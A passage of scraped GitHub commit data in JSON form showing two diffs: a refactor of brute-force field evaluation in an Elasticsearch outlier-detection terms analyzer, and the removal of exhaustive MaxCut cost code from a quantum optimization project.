timestamp, deployment name, etc.\n-                if \".\" in field_name:\n-                    self.model_settings[\"target\"] = list([field_name])\n-                    self.model_settings[\"brute_forced_field\"] = field_name  # so it can be added to the outlier events automatically\n-                    brute_force = True\n-\n+            for target_field in target_fields_to_brute_force:\n+                self.model_settings[\"brute_forced_field\"] = target_field\n+                search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])\n+                self.evaluate_target(target=[self.model_settings[\"brute_forced_field\"]], search_query=search_query, brute_force=True)\n         else:\n-            brute_force = False\n-\n-        if brute_force:\n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])\n-        else:\n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n+            self.evaluate_target(target=self.model_settings[\"target\"], search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"]), brute_force=False)\n \n+    def evaluate_target(self, target, search_query, brute_force=False):\n         self.total_events = es.count_documents(search_query=search_query)\n \n         logging.print_analysis_intro(event_type=\"evaluating \" + self.model_name, total_events=self.total_events)\n         logging.init_ticker(total_steps=self.total_events, desc=self.model_name + \" - evaluating terms model\")\n \n+        if brute_force:\n+            logging.logger.info(\"brute forcing field %s\", str(target[0]))\n+\n         eval_terms_array = defaultdict()\n         total_terms_added = 0\n \n","add":11,"remove":44,"filename":"\/app\/analyzers\/terms.py","badparts":["        if \"*\" in self.model_settings[\"target\"]:","            brute_force = False","            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])","            batch_size = settings.config.getint(\"terms\", \"terms_batch_eval_size\")","            self.total_events = es.count_documents(search_query=search_query)","            logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name + \" - extracting brute force fields\")","            field_names = set()","            num_docs_processed = 0","            for doc in es.scan(search_query=search_query):","                logging.tick()","                fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])","                fields = helpers.utils.flatten_dict(fields)","                for field_name in list(fields.keys()):  # create list instead of iterator so we can mutate the dictionary when iterating","                    if field_name.startswith('outliers.'):","                        logging.logger.debug(\"not brute forcing outliers field \" + str(field_name))","                        fields.pop(field_name)","                field_names.update(fields.keys())","                if num_docs_processed == batch_size:","                    break","                else:","                    num_docs_processed += 1","            logging.logger.info(\"going to brute force \" + str(len(field_names)) + \" fields\")","            for field_name in field_names:","                if \".\" in field_name:","                    self.model_settings[\"target\"] = list([field_name])","                    self.model_settings[\"brute_forced_field\"] = field_name  # so it can be added to the outlier events automatically","                    brute_force = True","            brute_force = False","        if brute_force:","            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])","        else:","            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])"],"goodparts":["        if self.model_settings[\"brute_force_target\"]:","            target_fields_to_brute_force = self.calculate_target_fields_to_brute_force()","            for target_field in target_fields_to_brute_force:","                self.model_settings[\"brute_forced_field\"] = target_field","                search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])","                self.evaluate_target(target=[self.model_settings[\"brute_forced_field\"]], search_query=search_query, brute_force=True)","            self.evaluate_target(target=self.model_settings[\"target\"], search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"]), brute_force=False)","    def evaluate_target(self, target, search_query, brute_force=False):","        if brute_force:","            logging.logger.info(\"brute forcing field %s\", str(target[0]))"]},{"diff":"\n             fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n \n             try:\n-                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"target\"])\n+                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=target)\n                 aggregator_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"aggregator\"])\n                 will_process_doc = True\n             except (KeyError, TypeError):\n","add":1,"remove":1,"filename":"\/app\/analyzers\/terms.py","badparts":["                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"target\"])"],"goodparts":["                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=target)"]}],"source":"\nimport random from helpers.singletons import settings, es, logging from collections import defaultdict from collections import Counter import helpers.utils from helpers.analyzer import Analyzer class TermsAnalyzer(Analyzer): def evaluate_model(self): self.extract_additional_model_settings() if \"*\" in self.model_settings[\"target\"]: brute_force=False logging.logger.warning(\"running terms model in brute force mode, could take a long time!\") search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"]) batch_size=settings.config.getint(\"terms\", \"terms_batch_eval_size\") self.total_events=es.count_documents(search_query=search_query) logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name +\" -extracting brute force fields\") field_names=set() num_docs_processed=0 for doc in es.scan(search_query=search_query): logging.tick() fields=es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"]) fields=helpers.utils.flatten_dict(fields) for field_name in list(fields.keys()): if field_name.startswith('outliers.'): logging.logger.debug(\"not brute forcing outliers field \" +str(field_name)) fields.pop(field_name) field_names.update(fields.keys()) if num_docs_processed==batch_size: break else: num_docs_processed +=1 logging.logger.info(\"going to brute force \" +str(len(field_names)) +\" fields\") for field_name in field_names: if \".\" in field_name: self.model_settings[\"target\"]=list([field_name]) self.model_settings[\"brute_forced_field\"]=field_name brute_force=True else: brute_force=False if brute_force: search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"] +\" AND _exists_:\" +self.model_settings[\"brute_forced_field\"]) else: search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"]) self.total_events=es.count_documents(search_query=search_query) logging.print_analysis_intro(event_type=\"evaluating \" +self.model_name, total_events=self.total_events) logging.init_ticker(total_steps=self.total_events, desc=self.model_name +\" -evaluating terms model\") eval_terms_array=defaultdict() total_terms_added=0 outlier_batches_trend=0 for doc in es.scan(search_query=search_query): logging.tick() fields=es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"]) try: target_sentences=helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"target\"]) aggregator_sentences=helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"aggregator\"]) will_process_doc=True except(KeyError, TypeError): logging.logger.debug(\"Skipping event which does not contain the target and aggregator fields we are processing. -[\" +self.model_name +\"]\") will_process_doc=False if will_process_doc: observations=dict() if brute_force: observations[\"brute_forced_field\"]=self.model_settings[\"brute_forced_field\"] for target_sentence in target_sentences: flattened_target_sentence=helpers.utils.flatten_sentence(target_sentence) for aggregator_sentence in aggregator_sentences: flattened_aggregator_sentence=helpers.utils.flatten_sentence(aggregator_sentence) eval_terms_array=self.add_term_to_batch(eval_terms_array, flattened_aggregator_sentence, flattened_target_sentence, observations, doc) total_terms_added +=len(target_sentences) last_batch=(logging.current_step==self.total_events) if last_batch or total_terms_added >=settings.config.getint(\"terms\", \"terms_batch_eval_size\"): logging.logger.info(\"evaluating batch of \" +\"{:,}\".format(total_terms_added) +\" terms\") outliers=self.evaluate_batch_for_outliers(terms=eval_terms_array) if len(outliers) > 0: unique_summaries=len(set(o.outlier_dict[\"summary\"] for o in outliers)) logging.logger.info(\"total outliers in batch processed: \" +str(len(outliers)) +\"[\" +str(unique_summaries) +\" unique summaries]\") outlier_batches_trend +=1 else: logging.logger.info(\"no outliers detected in batch\") outlier_batches_trend -=1 if outlier_batches_trend==-3 and brute_force: logging.logger.info(\"too many batches without outliers, we are not going to continue brute forcing\") break if outlier_batches_trend==3 and brute_force: logging.logger.info(\"too many batches with outliers, we are not going to continue brute forcing\") break eval_terms_array=defaultdict() total_terms_added=0 self.print_analysis_summary() def extract_additional_model_settings(self): self.model_settings[\"target\"]=settings.config.get(self.config_section_name, \"target\").replace(' ', '').split(\",\") self.model_settings[\"aggregator\"]=settings.config.get(self.config_section_name, \"aggregator\").replace(' ', '').split(\",\") self.model_settings[\"trigger_on\"]=settings.config.get(self.config_section_name, \"trigger_on\") self.model_settings[\"trigger_method\"]=settings.config.get(self.config_section_name, \"trigger_method\") self.model_settings[\"trigger_sensitivity\"]=settings.config.getint(self.config_section_name, \"trigger_sensitivity\") self.model_settings[\"target_count_method\"]=settings.config.get(self.config_section_name, \"target_count_method\") if self.model_settings[\"target_count_method\"] not in{\"within_aggregator\", \"across_aggregators\"}: raise ValueError(\"target count method \" +self.model_settings[\"target_count_method\"] +\" not supported\") if self.model_settings[\"trigger_on\"] not in{\"high\", \"low\"}: raise ValueError(\"Unexpected outlier trigger condition \" +self.model_settings[\"trigger_on\"]) @staticmethod def add_term_to_batch(eval_terms_array, aggregator_value, target_value, observations, doc): if aggregator_value not in eval_terms_array.keys(): eval_terms_array[aggregator_value]=defaultdict(list) eval_terms_array[aggregator_value][\"targets\"].append(target_value) eval_terms_array[aggregator_value][\"observations\"].append(observations) eval_terms_array[aggregator_value][\"raw_docs\"].append(doc) return eval_terms_array def evaluate_batch_for_outliers(self, terms=None): outliers=list() if self.model_settings[\"target_count_method\"]==\"across_aggregators\": unique_target_counts_across_aggregators=list() for i, aggregator_value in enumerate(terms): unique_targets_in_aggregated_value=set(terms[aggregator_value][\"targets\"]) unique_target_counts_across_aggregators.append(len(unique_targets_in_aggregated_value)) decision_frontier=helpers.utils.get_decision_frontier(self.model_settings[\"trigger_method\"], unique_target_counts_across_aggregators, self.model_settings[\"trigger_sensitivity\"], self.model_settings[\"trigger_on\"]) logging.logger.debug(\"using \" +self.model_settings[\"trigger_method\"] +\" decision frontier \" +str(decision_frontier) +\" across all aggregators\") non_outlier_values=set() for i, aggregator_value in enumerate(terms): unique_target_count_across_aggregators=unique_target_counts_across_aggregators[i] logging.logger.debug(\"unique target count for aggregator \" +str(aggregator_value) +\": \" +str(unique_target_count_across_aggregators) +\" -decision frontier \" +str(decision_frontier)) is_outlier=helpers.utils.is_outlier(unique_target_count_across_aggregators, decision_frontier, self.model_settings[\"trigger_on\"]) if is_outlier: for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]): non_outlier_values_sample=\",\".join(random.sample(non_outlier_values, min(3, len(non_outlier_values)))) observations=dict() observations[\"non_outlier_values_sample\"]=non_outlier_values_sample observations[\"term_count\"]=unique_target_count_across_aggregators observations[\"aggregator\"]=aggregator_value observations[\"term\"]=term_value observations[\"decision_frontier\"]=decision_frontier observations[\"trigger_method\"]=str(self.model_settings[\"trigger_method\"]) calculated_observations=terms[observations[\"aggregator\"]][\"observations\"][ii] calculated_observations.update(observations) raw_doc=terms[observations[\"aggregator\"]][\"raw_docs\"][ii] fields=es.extract_fields_from_document(raw_doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"]) outliers.append(self.process_outlier(fields, raw_doc, extra_outlier_information=calculated_observations)) else: for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]): non_outlier_values.add(term_value) if self.model_settings[\"target_count_method\"]==\"within_aggregator\": for i, aggregator_value in enumerate(terms): counted_targets=Counter(terms[aggregator_value][\"targets\"]) counted_target_values=list(counted_targets.values()) logging.logger.debug(\"terms count for aggregator value \" +aggregator_value +\" -> \" +str(counted_targets)) decision_frontier=helpers.utils.get_decision_frontier(self.model_settings[\"trigger_method\"], counted_target_values, self.model_settings[\"trigger_sensitivity\"], self.model_settings[\"trigger_on\"]) logging.logger.debug(\"using \" +self.model_settings[\"trigger_method\"] +\" decision frontier \" +str(decision_frontier) +\" for aggregator \" +str(aggregator_value)) non_outlier_values=set() for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]): term_value_count=counted_targets[term_value] is_outlier=helpers.utils.is_outlier(term_value_count, decision_frontier, self.model_settings[\"trigger_on\"]) if is_outlier: non_outlier_values_sample=\",\".join(random.sample(non_outlier_values, min(3, len(non_outlier_values)))) observations=dict() observations[\"non_outlier_values_sample\"]=non_outlier_values_sample observations[\"term_count\"]=term_value_count observations[\"aggregator\"]=aggregator_value observations[\"term\"]=term_value observations[\"decision_frontier\"]=decision_frontier observations[\"trigger_method\"]=str(self.model_settings[\"trigger_method\"]) calculated_observations=terms[observations[\"aggregator\"]][\"observations\"][ii] calculated_observations.update(observations) raw_doc=terms[observations[\"aggregator\"]][\"raw_docs\"][ii] fields=es.extract_fields_from_document(raw_doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"]) outliers.append(self.process_outlier(fields, raw_doc, extra_outlier_information=calculated_observations)) else: non_outlier_values.add(term_value) return outliers ","sourceWithComments":"import random\n\nfrom helpers.singletons import settings, es, logging\nfrom collections import defaultdict\nfrom collections import Counter\nimport helpers.utils\nfrom helpers.analyzer import Analyzer\n\n\nclass TermsAnalyzer(Analyzer):\n\n    def evaluate_model(self):\n        self.extract_additional_model_settings()\n\n        if \"*\" in self.model_settings[\"target\"]:\n            brute_force = False\n\n            logging.logger.warning(\"running terms model in brute force mode, could take a long time!\")\n\n            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n            batch_size = settings.config.getint(\"terms\", \"terms_batch_eval_size\")\n\n            self.total_events = es.count_documents(search_query=search_query)\n            logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name + \" - extracting brute force fields\")\n\n            field_names = set()\n            num_docs_processed = 0\n            for doc in es.scan(search_query=search_query):\n                logging.tick()\n                fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n                fields = helpers.utils.flatten_dict(fields)\n\n                # skip all fields that are related to outliers, we don't want to brute force them\n                for field_name in list(fields.keys()):  # create list instead of iterator so we can mutate the dictionary when iterating\n                    if field_name.startswith('outliers.'):\n                        logging.logger.debug(\"not brute forcing outliers field \" + str(field_name))\n                        fields.pop(field_name)\n\n                field_names.update(fields.keys())\n\n                # only process a single batch of events in order to decide which fields to brute force\n                if num_docs_processed == batch_size:\n                    break\n                else:\n                    num_docs_processed += 1\n\n            logging.logger.info(\"going to brute force \" + str(len(field_names)) + \" fields\")\n            for field_name in field_names:\n                # only brute force nested fields, so not the top level fields such as timestamp, deployment name, etc.\n                if \".\" in field_name:\n                    self.model_settings[\"target\"] = list([field_name])\n                    self.model_settings[\"brute_forced_field\"] = field_name  # so it can be added to the outlier events automatically\n                    brute_force = True\n\n        else:\n            brute_force = False\n\n        if brute_force:\n            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])\n        else:\n            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n\n        self.total_events = es.count_documents(search_query=search_query)\n\n        logging.print_analysis_intro(event_type=\"evaluating \" + self.model_name, total_events=self.total_events)\n        logging.init_ticker(total_steps=self.total_events, desc=self.model_name + \" - evaluating terms model\")\n\n        eval_terms_array = defaultdict()\n        total_terms_added = 0\n\n        outlier_batches_trend = 0\n        for doc in es.scan(search_query=search_query):\n            logging.tick()\n            fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n\n            try:\n                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"target\"])\n                aggregator_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"aggregator\"])\n                will_process_doc = True\n            except (KeyError, TypeError):\n                logging.logger.debug(\"Skipping event which does not contain the target and aggregator fields we are processing. - [\" + self.model_name + \"]\")\n                will_process_doc = False\n\n            if will_process_doc:\n                observations = dict()\n\n                if brute_force:\n                    observations[\"brute_forced_field\"] = self.model_settings[\"brute_forced_field\"]\n\n                for target_sentence in target_sentences:\n                    flattened_target_sentence = helpers.utils.flatten_sentence(target_sentence)\n\n                    for aggregator_sentence in aggregator_sentences:\n                        flattened_aggregator_sentence = helpers.utils.flatten_sentence(aggregator_sentence)\n                        eval_terms_array = self.add_term_to_batch(eval_terms_array, flattened_aggregator_sentence, flattened_target_sentence, observations, doc)\n\n                total_terms_added += len(target_sentences)\n\n            # Evaluate batch of events against the model\n            last_batch = (logging.current_step == self.total_events)\n            if last_batch or total_terms_added >= settings.config.getint(\"terms\", \"terms_batch_eval_size\"):\n                logging.logger.info(\"evaluating batch of \" + \"{:,}\".format(total_terms_added) + \" terms\")\n                outliers = self.evaluate_batch_for_outliers(terms=eval_terms_array)\n\n                if len(outliers) > 0:\n                    unique_summaries = len(set(o.outlier_dict[\"summary\"] for o in outliers))\n                    logging.logger.info(\"total outliers in batch processed: \" + str(len(outliers)) + \" [\" + str(unique_summaries) + \" unique summaries]\")\n                    outlier_batches_trend += 1\n                else:\n                    logging.logger.info(\"no outliers detected in batch\")\n                    outlier_batches_trend -= 1\n\n                if outlier_batches_trend == -3 and brute_force:\n                    logging.logger.info(\"too many batches without outliers, we are not going to continue brute forcing\")\n                    break\n\n                if outlier_batches_trend == 3 and brute_force:\n                    logging.logger.info(\"too many batches with outliers, we are not going to continue brute forcing\")\n                    break\n\n                # Reset data structures for next batch\n                eval_terms_array = defaultdict()\n                total_terms_added = 0\n\n        self.print_analysis_summary()\n\n    def extract_additional_model_settings(self):\n        self.model_settings[\"target\"] = settings.config.get(self.config_section_name, \"target\").replace(' ', '').split(\",\")  # remove unnecessary whitespace, split fields\n        self.model_settings[\"aggregator\"] = settings.config.get(self.config_section_name, \"aggregator\").replace(' ', '').split(\",\")  # remove unnecessary whitespace, split fields\n\n        self.model_settings[\"trigger_on\"] = settings.config.get(self.config_section_name, \"trigger_on\")\n        self.model_settings[\"trigger_method\"] = settings.config.get(self.config_section_name, \"trigger_method\")\n        self.model_settings[\"trigger_sensitivity\"] = settings.config.getint(self.config_section_name, \"trigger_sensitivity\")\n\n        self.model_settings[\"target_count_method\"] = settings.config.get(self.config_section_name, \"target_count_method\")\n\n        # Validate model settings\n        if self.model_settings[\"target_count_method\"] not in {\"within_aggregator\", \"across_aggregators\"}:\n            raise ValueError(\"target count method \" + self.model_settings[\"target_count_method\"] + \" not supported\")\n\n        if self.model_settings[\"trigger_on\"] not in {\"high\", \"low\"}:\n            raise ValueError(\"Unexpected outlier trigger condition \" + self.model_settings[\"trigger_on\"])\n\n    @staticmethod\n    def add_term_to_batch(eval_terms_array, aggregator_value, target_value, observations, doc):\n        if aggregator_value not in eval_terms_array.keys():\n            eval_terms_array[aggregator_value] = defaultdict(list)\n\n        eval_terms_array[aggregator_value][\"targets\"].append(target_value)\n        eval_terms_array[aggregator_value][\"observations\"].append(observations)\n        eval_terms_array[aggregator_value][\"raw_docs\"].append(doc)\n\n        return eval_terms_array\n\n    def evaluate_batch_for_outliers(self, terms=None):\n        # Initialize\n        outliers = list()\n\n        # In case we want to count terms across different aggregators, we need to first iterate over all aggregators\n        # and calculate the total number of unique terms for each aggregated value.\n        # For example:\n        # terms[\"smsc.exe\"][A, B, C, D, D, E]\n        # terms[\"abc.exe\"][A, A, B]\n        # is converted into:\n        # unique_target_counts_across_aggregators: [5, 2] (the first term contains 5 unique values, the second one contains 2)\n        if self.model_settings[\"target_count_method\"] == \"across_aggregators\":\n            unique_target_counts_across_aggregators = list()\n\n            # loop 0: {i=0, aggregator_value = \"smsc.exe\"}, loop 1: {i=1, aggregator_value = \"abc.exe\"},\n            for i, aggregator_value in enumerate(terms):\n                # unique_targets_in_aggregated_value = loop 0: [A, B, C, D, E], loop 1: [A, A, B]\n                # unique_target_counts_across_aggregators = loop 0: [5], loop 1: [5, 2]\n                unique_targets_in_aggregated_value = set(terms[aggregator_value][\"targets\"])\n                unique_target_counts_across_aggregators.append(len(unique_targets_in_aggregated_value))\n\n            # Calculate the decision frontier\n            # unique_target_counts_across_aggregators = [5, 2]\n            decision_frontier = helpers.utils.get_decision_frontier(self.model_settings[\"trigger_method\"], unique_target_counts_across_aggregators, self.model_settings[\"trigger_sensitivity\"], self.model_settings[\"trigger_on\"])\n            logging.logger.debug(\"using \" + self.model_settings[\"trigger_method\"] + \" decision frontier \" + str(decision_frontier) + \" across all aggregators\")\n\n            non_outlier_values = set()\n\n            # loop 0: {i=0, aggregator_value = \"smsc.exe\"}, loop 1: {i=1, aggregator_value = \"abc.exe\"},\n            for i, aggregator_value in enumerate(terms):\n                unique_target_count_across_aggregators = unique_target_counts_across_aggregators[i]\n                logging.logger.debug(\"unique target count for aggregator \" + str(aggregator_value) + \": \" + str(unique_target_count_across_aggregators) + \" - decision frontier \" + str(decision_frontier))\n                is_outlier = helpers.utils.is_outlier(unique_target_count_across_aggregators, decision_frontier, self.model_settings[\"trigger_on\"])\n\n                if is_outlier:\n                    for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]):\n                        non_outlier_values_sample = \",\".join(random.sample(non_outlier_values, min(3, len(non_outlier_values))))\n\n                        observations = dict()\n                        observations[\"non_outlier_values_sample\"] = non_outlier_values_sample\n                        observations[\"term_count\"] = unique_target_count_across_aggregators\n                        observations[\"aggregator\"] = aggregator_value\n                        observations[\"term\"] = term_value\n                        observations[\"decision_frontier\"] = decision_frontier\n                        observations[\"trigger_method\"] = str(self.model_settings[\"trigger_method\"])\n\n                        calculated_observations = terms[observations[\"aggregator\"]][\"observations\"][ii]\n                        calculated_observations.update(observations)\n\n                        raw_doc = terms[observations[\"aggregator\"]][\"raw_docs\"][ii]\n                        fields = es.extract_fields_from_document(raw_doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n                        outliers.append(self.process_outlier(fields, raw_doc, extra_outlier_information=calculated_observations))\n                else:\n                    for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]):\n                        non_outlier_values.add(term_value)\n\n        # In case we want to count terms within an aggregator, it's a bit easier.\n        # For example:\n        # terms[\"smsc.exe\"][A, B, C, D, D, E]\n        # terms[\"abc.exe\"][A, A, B]\n        # is converted into:\n        # First iteration: \"smsc.exe\" -> counted_target_values: {A: 1, B: 1, C: 1, D: 2, E: 1}\n        # For each aggregator, we iterate over all terms within it:\n        # term_value_count for a document with term \"A\" then becomes \"1\" in the example above.\n        # we then flag an outlier if that \"1\" is an outlier in the array [\"1 1 1 2 1\"]\n        if self.model_settings[\"target_count_method\"] == \"within_aggregator\":\n            for i, aggregator_value in enumerate(terms):\n                # Count percentage of each target value occuring\n                counted_targets = Counter(terms[aggregator_value][\"targets\"])\n                counted_target_values = list(counted_targets.values())\n\n                logging.logger.debug(\"terms count for aggregator value \" + aggregator_value + \" -> \" + str(counted_targets))\n                decision_frontier = helpers.utils.get_decision_frontier(self.model_settings[\"trigger_method\"], counted_target_values, self.model_settings[\"trigger_sensitivity\"], self.model_settings[\"trigger_on\"])\n\n                logging.logger.debug(\"using \" + self.model_settings[\"trigger_method\"] + \" decision frontier \" + str(decision_frontier) + \" for aggregator \" + str(aggregator_value))\n\n                non_outlier_values = set()\n                for ii, term_value in enumerate(terms[aggregator_value][\"targets\"]):\n                    term_value_count = counted_targets[term_value]\n                    is_outlier = helpers.utils.is_outlier(term_value_count, decision_frontier, self.model_settings[\"trigger_on\"])\n\n                    if is_outlier:\n                        non_outlier_values_sample = \",\".join(random.sample(non_outlier_values, min(3, len(non_outlier_values))))\n\n                        observations = dict()\n                        observations[\"non_outlier_values_sample\"] = non_outlier_values_sample\n                        observations[\"term_count\"] = term_value_count\n                        observations[\"aggregator\"] = aggregator_value\n                        observations[\"term\"] = term_value\n                        observations[\"decision_frontier\"] = decision_frontier\n                        observations[\"trigger_method\"] = str(self.model_settings[\"trigger_method\"])\n\n                        calculated_observations = terms[observations[\"aggregator\"]][\"observations\"][ii]\n                        calculated_observations.update(observations)\n\n                        raw_doc = terms[observations[\"aggregator\"]][\"raw_docs\"][ii]\n                        fields = es.extract_fields_from_document(raw_doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n                        outliers.append(self.process_outlier(fields, raw_doc, extra_outlier_information=calculated_observations))\n                    else:\n                        non_outlier_values.add(term_value)\n        return outliers\n"}},"msg":"improved brute forcing model"}},"https:\/\/github.com\/ioankolot\/AQC-PQC":{"8dc0cc4f01869e9e3bd93b6cfcb66c4f5e2c3da3":{"url":"https:\/\/api.github.com\/repos\/ioankolot\/AQC-PQC\/commits\/8dc0cc4f01869e9e3bd93b6cfcb66c4f5e2c3da3","html_url":"https:\/\/github.com\/ioankolot\/AQC-PQC\/commit\/8dc0cc4f01869e9e3bd93b6cfcb66c4f5e2c3da3","message":"added brute force and minor changes","sha":"8dc0cc4f01869e9e3bd93b6cfcb66c4f5e2c3da3","keyword":"brute force change","diff":"diff --git a\/__pycache__\/aqc_pqc.cpython-39.pyc b\/__pycache__\/aqc_pqc.cpython-39.pyc\nindex 965e2f9..38a96a3 100644\nBinary files a\/__pycache__\/aqc_pqc.cpython-39.pyc and b\/__pycache__\/aqc_pqc.cpython-39.pyc differ\ndiff --git a\/__pycache__\/brute_force.cpython-39.pyc b\/__pycache__\/brute_force.cpython-39.pyc\nnew file mode 100644\nindex 0000000..90d016c\nBinary files \/dev\/null and b\/__pycache__\/brute_force.cpython-39.pyc differ\ndiff --git a\/__pycache__\/hamiltonian.cpython-39.pyc b\/__pycache__\/hamiltonian.cpython-39.pyc\nindex 6b77c2f..f0a2b1d 100644\nBinary files a\/__pycache__\/hamiltonian.cpython-39.pyc and b\/__pycache__\/hamiltonian.cpython-39.pyc differ\ndiff --git a\/aqc_pqc.py b\/aqc_pqc.py\nindex ab1d4a8..93b6747 100644\n--- a\/aqc_pqc.py\n+++ b\/aqc_pqc.py\n@@ -187,117 +187,3 @@ def minim_eig_constraint(x):\n \n         return energies_aqcpqc\n \n-\n-\n-'''\n-def best_cost_brute(adjacency_matrix): #This function calculates the optimal cost function by brute force\n-    best_cost = 0\n-    number_of_qubits = len(adjacency_matrix)\n-    best_string = 0\n-    costs = collections.defaultdict(list)\n-    for b in range(2**number_of_qubits):\n-        x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]\n-        cost = 0\n-        for i in range(number_of_qubits):\n-            for j in range(number_of_qubits):\n-                cost += adjacency_matrix[i,j] * x[i] * (1-x[j])\n-\n-        cost = np.round(cost,5)\n-        x.reverse()\n-        costs[cost].append(x)\n-\n-        if best_cost < cost:\n-            best_cost = cost\n-            best_string = x\n-\n-    costs = sorted(costs.items())\n-    return best_cost, best_string, costs\n-\n-\n-best_cost, best_string, costs = best_cost_brute(w)\n-print(costs)\n-print(f'For the given instance the optimal cost is {best_cost} and the bitstrings corresponding to that are {costs[-1][1]}')\n-\n-\n-\n-\n-\n-\n-def get_offset(number_of_qubits, adjacency_matrix): #The offset (constant part of the Hamiltonian) for a general graph.\n-    offset = 0\n-    for i in range(number_of_qubits):\n-        for j in range(number_of_qubits):\n-            if i<j:\n-                offset += adjacency_matrix[i,j]\/2\n-    return offset\n-\n-\n-def minimum_instantaneous(time): #This gives the minimum energy at a given time.\n-    hamil = calculate_instantaneous_hamiltonian(time)\n-    eigenvalues, v1 = np.linalg.eig(hamil)\n-    min_eig = np.min(eigenvalues) - time*offset\n-    return np.real(min_eig)\n-\n-\n-def calculate_spectrum(steps, plot=True):\n-    gs_energies = []\n-    first_excited_energies = []\n-    ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = [],[],[],[],[],[],[],[],[],[]\n-    for step in range(steps+1):\n-        hamiltonian = calculate_instantaneous_hamiltonian(step\/steps)\n-        q, v = np.linalg.eigh(hamiltonian)\n-        q = sorted(q)\n-        gs_energy = q[0]\n-        en1, en2, en3, en4, en5, en6, en7, en8, en9, en10 = q[1], q[2], q[3], q[4], q[5], q[6], q[7], q[8], q[9], q[10]\n-        for k in range(len(q)):\n-            if np.round(q[k], 5) != np.round(gs_energy, 5):\n-                break\n-        first_excited_energy = q[k+1]\n-\n-        ener1.append(en1-(step\/steps)*offset)\n-        ener2.append(en2-(step\/steps)*offset)\n-        ener3.append(en3-(step\/steps)*offset)\n-        ener4.append(en4-(step\/steps)*offset)\n-        ener5.append(en5-(step\/steps)*offset)\n-        ener6.append(en6-(step\/steps)*offset)\n-        ener7.append(en7-(step\/steps)*offset)\n-        ener8.append(en8-(step\/steps)*offset)\n-        ener9.append(en9-(step\/steps)*offset)\n-        ener10.append(en10-(step\/steps)*offset)\n-        gs_energies.append(gs_energy-(step\/steps)*offset)\n-        first_excited_energies.append(first_excited_energy-(step\/steps)*offset)\n-    \n-    time = [step\/steps for step in range(steps+1)]\n-    if plot == True:\n-        plt.plot(time, gs_energies, label='Ground State energy')\n-        #plt.plot(time, first_excited_energies, label='First Excited energy')\n-        plt.plot(time, ener1, label='energy1')\n-        plt.plot(time, ener2, label='energy2')\n-        plt.plot(time, ener3, label='energy3')\n-        plt.plot(time, ener4, label='energy4')\n-        plt.plot(time, ener5, label='energy5')\n-        plt.plot(time, ener6, label='energy6')\n-        plt.plot(time, ener7, label='energy7')\n-        plt.plot(time, ener8, label='energy8')\n-        plt.plot(time, ener9, label='energy9')\n-        plt.plot(time, ener10, label='energy10')\n-        plt.legend(fontsize=14)\n-        plt.show()\n-\n-    return gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10\n-\n-gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = calculate_spectrum(steps)\n-\n-print(gs_energies)\n-print(first_excited_energies)\n-\n-#We must first calculate the linear system of equations.\n-\n-\n-\n-\n-#energies_aqqpqc_0_layer = [-6, -5.950000000000003, -5.900000000000002, -5.850000000000002, -5.8000000000000025, -5.7500000000000036, -5.700000000000003, -5.650000000000001, -5.600000000000002, -5.550000000000001, -5.500000000000002, -5.450000000000001, -5.400000000000001, -5.3675997603859695, -5.364692179604818, -5.384587040477438, -5.422425754662893, 